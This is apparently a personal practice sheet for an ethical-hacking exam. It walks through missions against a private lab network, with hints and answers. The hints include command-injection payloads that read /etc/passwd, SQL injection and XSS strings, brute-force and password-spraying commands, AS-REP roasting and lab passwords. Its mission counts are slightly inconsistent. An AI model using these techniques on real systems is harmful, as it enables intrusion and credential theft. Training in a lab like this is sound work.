# Practice challenges

Pentest scenario — ACME Corp network (10.10.55.0/24), find all the flags.

- Attacker: Parrot VM (10.10.55.5)
- Use cheatsheets
- Each challenge should take <10 min
- Try before looking at answers  
  
---  
  
## Phase 1: Reconnaissance (Exam minutes 0-45)  
  
### Mission 1.1 — Map The Network  
> "We don't even know what's on our network." — ACME Corp CEO  
  
**Objective:** Discover all live hosts and their services.  
  
```  
Tasks:  
□ How many hosts are alive on 10.10.55.0/24? 3  
□ Which host is the Domain Controller? How do you know?  
□ Which host runs a web server?  
□ Which host has NFS exports?  
□ List ALL open ports on each host.  
```  
  
<details>  
<summary>Hints</summary>  
  
- `nmap -sn 10.10.55.0/24`  
- `nmap -sS -sV -O -p- -oA recon 10.10.55.0/24`  
- DC = port 88 + 389  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- 3 hosts alive: .10, .11, .22  
- DC = 10.10.55.22 (Kerberos 88, LDAP 389)  
- Web = 10.10.55.10 (port 80)  
- NFS = 10.10.55.11 (port 2049)  
  
</details>  
  
---  
  
### Mission 1.2 — OS Fingerprinting  
> "What operating systems are they running?"  
  
```  
Tasks:  
□ What OS is 10.10.55.10 running?  
□ What OS is 10.10.55.22 running?  
□ What is the domain name of the AD environment?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `nmap -O 10.10.55.10`  
- `nmap -A -sC -sV 10.10.55.22`  
- Look for "Domain:" in the nmap output  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Both run Debian 12 (Linux)  
- Domain: CEH.COM  
  
</details>  
  
---  
  
## Phase 2: Web Application Attacks (Exam: 5-7 flags!)  
  
### Mission 2.1 — SQL Injection: The Database Heist  
> "Our developer said the user lookup page is secure. Prove him wrong."  
  
**Target:** http://10.10.55.10/sqli.php?id=1  
  
```  
Tasks:  
□ Use SQLMap to find all database names on the server.  
□ What tables exist in the 'dvwa' database?  
□ Dump the 'users' table. What is admin's password hash?  
□ How many users are in the database?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `sqlmap -u "http://10.10.55.10/sqli.php?id=1" --dbs`  
- `sqlmap -u "http://10.10.55.10/sqli.php?id=1" -D dvwa --tables`  
- `sqlmap -u "http://10.10.55.10/sqli.php?id=1" -D dvwa -T users --dump`  
  
</details>  
  
---  
  
### Mission 2.2 — Command Injection: Break Out  
> "The network diagnostic tool should only ping... right?"  
  
**Target:** http://10.10.55.10/cmd.php  
  
```  
Tasks:  
□ Read /etc/passwd through the ping form. How many user accounts exist?  
□ What is the hostname of this machine?  
□ Read the Apache config. What is the DocumentRoot?  
□ Can you read /etc/shadow? Why or why not?  
```  
  
<details>  
<summary>Hints</summary>  
  
In the IP field, try:  
- `; cat /etc/passwd`  
- `; hostname`  
- `; cat /etc/apache2/sites-available/000-default.conf`  
- `| whoami` (are you root or www-data?)  
  
</details>  
  
---  
  
### Mission 2.3 — WordPress Takeover  
> "Our marketing team set up a blog. They said they'd secure it later..."  
  
**Target:** http://10.10.55.10/wordpress  
  
```  
Tasks:  
□ Enumerate all WordPress users. What usernames exist?  
□ What WordPress version is installed?  
□ Are there any vulnerable plugins?  
□ Brute force the login for user 'wpuser'. What is the password?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `wpscan --url http://10.10.55.10/wordpress --enumerate u`  
- `wpscan --url http://10.10.55.10/wordpress --enumerate vp`  
- `wpscan --url http://10.10.55.10/wordpress -U wpuser -P /usr/share/wordlists/rockyou.txt`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- User: wpuser  
- Password: wppass123  
  
</details>  
  
---  
  
### Mission 2.4 — Web Server Reconnaissance  
> "What can an attacker learn just by looking at our web server?"  
  
**Target:** http://10.10.55.10  
  
```  
Tasks:  
□ What web server software and version is running?  
□ What hidden directories can you find?  
□ Run a full Nikto scan. What critical findings are there?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `nikto -h http://10.10.55.10`  
- `dirb http://10.10.55.10`  
- `nmap -sV -p 80 10.10.55.10`  
  
</details>  
  
---  
  
### Mission 2.5 — DVWA Gauntlet  
> "Show me everything that's wrong with this app."  
  
**Target:** http://10.10.55.10/dvwa (admin/password)  
  
```  
Tasks:  
□ Login and set security to "Low"  
□ Perform SQL Injection via the DVWA SQLi page — extract all user passwords  
□ Perform Command Injection — read /etc/passwd  
□ Perform XSS (Reflected) — make an alert box pop up  
□ Perform XSS (Stored) — store a persistent XSS payload  
```  
  
<details>  
<summary>Hints</summary>  
  
SQLi: `' OR 1=1 #` in the User ID field  
Cmd Injection: `; cat /etc/passwd` in the IP field  
XSS Reflected: `&lt;script&gt;alert('XSS')&lt;/script&gt;` in the input
XSS Stored: same payload in the guestbook Name field  
  
</details>  
  
---  
  
## Phase 3: Password Cracking & Brute Force  
  
### Mission 3.1 — FTP: The Anonymous Leak  
> "Someone said our FTP server is wide open..."  
  
**Target:** 10.10.55.10:21  
  
```  
Tasks:  
□ Connect via anonymous FTP. What flag do you find?  
□ Brute force the 'ftpuser' account. What is the password?  
□ Login as ftpuser. What flag is in their home directory?  
□ Brute force the 'admin' account. What is the password?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `ftp 10.10.55.10` → user: anonymous, pass: (blank)  
- `hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 10.10.55.10 ftp`  
- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.55.10 ftp`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Anonymous flag: FLAG{ftp_anonymous_access}  
- ftpuser password: hunter2  
- ftpuser flag: FLAG{ftp_user_credentials_leaked}  
- admin password: password123  
  
</details>  
  
---  
  
### Mission 3.2 — SSH: Crack The Server  
> "Five employees use weak passwords. Find them."  
  
**Target:** 10.10.55.11:22  
  
```  
Tasks:  
□ Brute force SSH for user 'alice'. What is her password?  
□ Login as alice. What flag is in her home directory?  
□ Which other users share the same password as alice?  
□ Can you read /root/root_flag.txt as alice? How would you escalate?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `hydra -l alice -P /usr/share/wordlists/rockyou.txt 10.10.55.11 ssh`  
- After login: `cat ~/flag.txt`  
- Try same password for joshua, mark, bob  
- `sudo -l` or check SUID: `find / -perm -4000 2>/dev/null`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- alice: cupcake → FLAG{linux_user_alice_owned}  
- joshua and mark also use "cupcake"  
- bob uses "batman"  
  
</details>  
  
---  
  
### Mission 3.3 — Hash Cracking Lab  
> "We intercepted a file with NTLM hashes. Crack them."  
  
**Target:** SSH into 10.10.55.11 as alice, get /home/alice/hashes.txt  
  
```  
Tasks:  
□ Download hashes.txt to your Parrot machine  
□ Identify the hash type  
□ Crack all hashes using hashcat or john  
□ What are the plaintext passwords?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `scp alice@10.10.55.11:/home/alice/hashes.txt .`  
- Format is NTLM (pwdump format)  
- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`  
- Or: `john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`  
  
</details>  
  
---  
  
## Phase 4: Enumeration Deep Dive  
  
### Mission 4.1 — SNMP: The Chatty Protocol  
> "Our monitoring system might be leaking information..."  
  
**Target:** 10.10.55.11:161/udp  
  
```  
Tasks:  
□ What community string works? (try 'public')  
□ What is the system location?  
□ What is the system contact?  
□ What OS and kernel version is the target running?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `snmpwalk -v2c -c public 10.10.55.11`  
- `snmpwalk -v2c -c public 10.10.55.11 | grep -i syslocation`  
- `snmpwalk -v2c -c public 10.10.55.11 | grep -i syscontact`  
- `snmpwalk -v2c -c public 10.10.55.11 | grep -i sysdescr`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Community: public  
- Location: "Server Room, Floor 3"  
- Contact: admin@target.com  
  
</details>  
  
---  
  
### Mission 4.2 — NFS: The Open Share  
> "Someone configured a network share. Is it secure?"  
  
**Target:** 10.10.55.11:2049  
  
```  
Tasks:  
□ What NFS shares are exported?  
□ Mount the share. What files are inside?  
□ What flag is in the confidential file?  
□ Is the share exported with no_root_squash? Why is that dangerous?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `showmount -e 10.10.55.11`  
- `mkdir /tmp/nfs && sudo mount -t nfs 10.10.55.11:/srv/nfs/shared /tmp/nfs`  
- `cat /tmp/nfs/confidential.txt`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Export: /srv/nfs/shared  
- Flag: FLAG{nfs_share_exposed}  
- no_root_squash = remote root has root access on the share (privesc vector)  
  
</details>  
  
---  
  
### Mission 4.3 — SMTP: Who's Real?  
> "We need to know which email accounts actually exist on that mail server."  
  
**Target:** 10.10.55.11:25  
  
```  
Tasks:  
□ What SMTP commands does the server support?  
□ Enumerate valid users using VRFY method  
□ Which of these users exist: alice, bob, admin, root, ceo, hr?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `nmap -p 25 --script smtp-commands 10.10.55.11`  
- Create users.txt with: alice, bob, admin, root, ceo, hr  
- `smtp-user-enum -M VRFY -U users.txt -t 10.10.55.11`  
  
</details>  
  
---  
  
### Mission 4.4 — SMB: Domain Shares  
> "What can an unauthenticated user see on the domain controller?"  
  
**Target:** 10.10.55.22:445  
  
```  
Tasks:  
□ Enumerate shares on the DC. What shares exist?  
□ Can you access the 'shared' share as guest?  
□ What flag is inside?  
□ Enumerate domain users via SMB  
```  
  
<details>  
<summary>Hints</summary>  
  
- `enum4linux -a 10.10.55.22`  
- `smbclient //10.10.55.22/shared -N`  
- `nmap --script smb-enum-shares,smb-enum-users -p 445 10.10.55.22`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Flag: FLAG{smb_guest_share_access}  
  
</details>  
  
---  
  
### Mission 4.5 — LDAP: Directory Dump  
> "Can anyone just query our Active Directory?"  
  
**Target:** 10.10.55.22:389  
  
```  
Tasks:  
□ Perform anonymous LDAP bind. Does it work?  
□ List all user accounts in the directory  
□ What organizational units (OUs) exist?  
□ Find the user with DONT_REQUIRE_PREAUTH set  
```  
  
<details>  
<summary>Hints</summary>  
  
- `ldapsearch -x -h 10.10.55.22 -b "dc=CEH,dc=COM"`  
- `ldapsearch -x -h 10.10.55.22 -b "dc=CEH,dc=COM" "(objectclass=user)" cn`  
- `nmap -p 389 --script ldap-search 10.10.55.22`  
  
</details>  
  
---  
  
## Phase 5: Active Directory Attacks (NEW in v13!)  
  
### Mission 5.1 — AS-REP Roasting  
> "One of our AD users has Kerberos pre-authentication disabled. Exploit it."  
  
**Target:** 10.10.55.22 (DC for CEH.COM)  
  
```  
Tasks:  
□ Create a users.txt wordlist with: Administrator, Joshua, Mark, SQL_srv, DC-Admin  
□ Run GetNPUsers.py to find AS-REP roastable accounts  
□ Which user is vulnerable?  
□ Crack the hash. What is the password?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `echo -e "Administrator\nJoshua\nMark\nSQL_srv\nDC-Admin" > users.txt`  
- `python3 /usr/share/impacket/GetNPUsers.py CEH.COM/ -no-pass -usersfile users.txt -dc-ip 10.10.55.22`  
- Save hash to file → `hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt`  
- Or: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Vulnerable user: Joshua  
- Password: cupcake  
  
</details>  
  
---  
  
### Mission 5.2 — Password Spraying  
> "If Joshua uses 'cupcake', maybe others do too..."  
  
```  
Tasks:  
□ Spray 'cupcake' across all known users on the subnet  
□ Which other users use 'cupcake'?  
□ Can you RDP/SSH into any machine with these creds?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `crackmapexec smb 10.10.55.22 -u users.txt -p "cupcake"`  
- `crackmapexec ssh 10.10.55.11 -u users.txt -p "cupcake"`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Mark and Joshua both use "cupcake"  
  
</details>  
  
---  
  
### Mission 5.3 — SMB & LDAP Full Enumeration  
> "Now that you have credentials, what else can you find?"  
  
```  
Tasks:  
□ Use valid creds to enumerate all domain groups  
□ Which user is in the "Domain Admins" group?  
□ List all SPNs in the domain (prep for Kerberoasting)  
```  
  
<details>  
<summary>Hints</summary>  
  
- `crackmapexec smb 10.10.55.22 -u Joshua -p cupcake --groups`  
- `ldapsearch -x -h 10.10.55.22 -D "Joshua@CEH.COM" -w cupcake -b "dc=CEH,dc=COM" "(memberOf=CN=Domain Admins,CN=Users,DC=CEH,DC=COM)"`  
- `python3 /usr/share/impacket/GetUserSPNs.py CEH.COM/Joshua:cupcake -dc-ip 10.10.55.22`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- DC-Admin is in Domain Admins  
  
</details>  
  
---  
  
## Phase 6: MySQL Direct Attack  
  
### Mission 6.1 — Database Pillage  
> "The MySQL server accepts remote connections. Exploit it."  
  
**Target:** 10.10.55.10:3306  
  
```  
Tasks:  
□ Connect to MySQL remotely. What databases exist?  
□ What tables are in the 'dvwa' database?  
□ Extract all usernames and password hashes from DVWA  
□ What tables are in the 'wordpress' database?  
□ Extract WordPress admin credentials  
```  
  
<details>  
<summary>Hints</summary>  
  
- `mysql -h 10.10.55.10 -u root -p` (password: toor)  
- `SHOW DATABASES;`  
- `USE dvwa; SELECT * FROM users;`  
- `USE wordpress; SELECT user_login, user_pass FROM wp_users;`  
  
</details>  
  
---  
  
## Scoring

| Phase | Challenges | Exam weight |
|-------|-----------|-------------|
| Recon | 3 missions | 15% |
| Web attacks | 5 missions | 35% |
| Password cracking | 3 missions | 15% |
| Enumeration | 5 missions | 15% |
| AD attacks | 3 missions | 15% |
| Database | 1 mission | 5% |

Total: 20 missions, same as the exam.  
  
---  
  
## Speedrun mode

After doing all missions once, try the speedrun:

- 3 hour timer (half of exam time)
- Gold: < 2 hours, Silver: < 3 hours, Bronze: < 4 hours
- If I can gold this, I pass the exam

---

## After each session

1. Which mission took the longest? Why?
2. Did I google anything? Add it to the cheatsheet.
3. Which tool syntax did I mess up? Practice 5 more times.
4. Could I do this faster?  
